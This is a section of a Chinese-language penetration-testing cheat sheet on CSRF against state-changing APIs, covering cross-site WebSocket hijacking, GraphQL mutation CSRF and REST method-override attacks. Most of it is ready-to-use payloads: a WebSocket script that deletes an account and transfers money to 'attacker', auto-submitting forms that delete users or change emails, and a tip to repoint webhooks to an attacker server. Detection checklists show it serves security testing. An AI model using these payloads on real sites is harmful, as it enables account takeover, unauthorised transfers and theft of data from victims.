## 十、状态改变类API CSRF（WebSocket/GraphQL/REST）

### 10.1 跨站WebSocket劫持（CSWSH）
```javascript
// WebSocket握手是普通GET Upgrade（无预检、无自定义头限制），
// 旧浏览器/无SameSite Cookie时握手自动携带Cookie
var ws = new WebSocket('wss://target.com/ws?session=xxx');
ws.onopen = function() {
  ws.send(JSON.stringify({type:'delete_account'}));
  ws.send(JSON.stringify({type:'transfer', to:'attacker', amount:10000}));
};

检测要点：
1. 握手是否校验Origin（服务器应校验，很多实现不校验）
2. 是否依赖Cookie/Session认证握手（SameSite未设置则直接可打）
3. 业务消息是否含Token/是否校验操作权限
4. 服务端是否校验 Sec-WebSocket-Protocol/自定义头
注意：现代浏览器SameSite=Lax下跨站WS握手GET不携带Cookie，需Lax绕过前置或服务端用URL参数认证
```

### 10.2 GraphQL mutation CSRF
```html
<!-- GraphQL通常是 application/json → 触发预检；利用text/plain或query参数绕过 -->
<!-- 方法1：text/plain拼JSON（部分GraphQL服务容忍） -->
<form action="https://target.com/graphql" method="POST" enctype="text/plain">
  <input name='{"query":"mutation{deleteAccount{id}}","x":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>

<!-- 方法2：URL编码query（GET方式，若服务端允许mutation走GET） -->
<img src="https://target.com/graphql?query=mutation%7BchangeEmail(email%3A%22a%40e.com%22)%7Bid%7D%7D">
```
**检测重点：** GraphQL批量/内省（introspection）接口、mutation操作是否与query共用CSRF防护、batched mutations、persisted queries（缓存查询ID可被滥用）。

### 10.3 REST PATCH/DELETE/PUT CSRF
```html
<!-- 方法覆盖（最常用） -->
<form action="https://target.com/api/user/123" method="POST">
  <input type="hidden" name="_method" value="DELETE">
</form>
<script>document.forms[0].submit();</script>

<!-- 若后端直接接受POST语义映射到PATCH/DELETE（宽松路由）→ 普通form POST即可 -->
<!-- JSON PATCH：text/plain + JSON数组体 -->
<form action="https://target.com/api/user" method="POST" enctype="text/plain">
  <input name='[{"op":"replace","path":"/email","value":"<EMAIL-REDACTED>"}]' value=''>
</form>
```
**批量/幂等操作：** 搜索支持`?ids=1,2,3`批量删除/更新的GET型接口、`action=delete`参数型接口——批量接口往往遗漏Token校验。

### 10.4 异步任务/回调类CSRF
```
- 任务队列触发接口（导出报表、发送邮件、触发流水线）
- Webhook回调地址修改（改到攻击者服务器窃取事件数据）
- 订阅/退订类接口（批量退订造成业务损失）
- 定时任务/Cron配置（持久化后门）
这些接口常"非表单友好"且无Token，但业务影响大，属高价值测试目标
```

